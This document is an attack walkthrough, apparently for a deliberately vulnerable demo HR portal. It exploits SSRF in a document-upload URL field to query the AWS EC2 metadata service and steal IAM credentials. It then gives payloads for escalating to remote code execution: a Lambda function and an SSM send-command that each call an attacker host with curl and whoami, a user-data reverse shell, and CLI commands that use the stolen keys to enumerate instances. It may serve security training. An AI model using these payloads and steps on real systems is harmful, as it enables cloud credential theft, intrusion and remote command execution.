
# Attack 2: Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE)

SSRF allows attackers to make the server perform HTTP requests to internal resources. This can be escalated to Remote Code Execution in certain scenarios.

## Step 1: Access the Document Upload Page

1. First, log in to the HR Portal (you can use the SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

## Step 2: Preparing for SSRF Attack

1. Select any file to upload (the content doesn't matter)
2. Look for the "Upload Destination URL" field
3. By default, it will contain `s3://employee-bucket/documents/`

## Step 3: Perform Basic SSRF to Access EC2 Metadata

1. Change the upload URL to: `http://169.254.169.254/latest/meta-data/`
2. Click "Upload Document"
3. The server will attempt to contact AWS metadata service instead of S3
4. Observe the response, which should contain EC2 metadata information

## Step 4: Extract IAM Credentials

1. Change the upload URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role`
2. Click "Upload Document"
3. This will return temporary AWS credentials including:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`
4. Save these credentials for the next steps

## Step 5: Escalate SSRF to RCE

For escalating SSRF to RCE, there are several potential paths depending on the environment:

1. **Lambda Function Method**:
   - Using the stolen AWS credentials, create a malicious Lambda function
   - Configure the Lambda with a code payload that executes system commands
   - Invoke the Lambda function using the vulnerable SSRF endpoint
   
   Sample payload for Lambda:
   ```javascript
   exports.handler = async (event) => {
     const { exec } = require('child_process');
     return new Promise((resolve, reject) => {
       exec('curl http://attacker-server.com/$(whoami)', (error, stdout, stderr) => {
         resolve({
           statusCode: 200,
           body: { stdout, stderr }
         });
       });
     });
   };
   ```

2. **EC2 User Data Method**:
   - If the EC2 instance has permissions to modify user data scripts
   - Create a new EC2 instance with malicious user data that contains a reverse shell
   - Use the SSRF to trigger execution of the user data script

3. **SSM Send Command Method**:
   - If the EC2 role has SSM permissions
   - Use AWS Systems Manager Send Command to execute arbitrary commands on the target EC2 instance
   ```bash
   aws ssm send-command \
     --document-name "AWS-RunShellScript" \
     --parameters commands=["curl http://attacker.com/$(whoami)"] \
     --targets "Key=instanceids,Values=i-1234567890abcdef0"
   ```

## Step 6: Configure AWS CLI with the Stolen Credentials

```bash
# Configure AWS CLI with the stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...  # Use the AccessKeyId from Step 4
export AWS_SECRET_ACCESS_KEY=...  # Use the SecretAccessKey from Step 4
export AWS_SESSION_TOKEN=...      # Use the Token from Step 4
export AWS_DEFAULT_REGION=us-east-1  # Adjust region if necessary
```

## Step 7: Use AWS CLI to Discover Other EC2 Instances

```bash
# List all EC2 instances in the account
aws ec2 describe-instances

# Store the Jenkins server information
JENKINS_INSTANCE_ID=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].InstanceId" --output text)
JENKINS_PRIVATE_IP=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].PrivateIpAddress" --output text)
JENKINS_AZ=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Demo-Jenkins" --query "Reservations[0].Instances[0].Placement.AvailabilityZone" --output text)
```
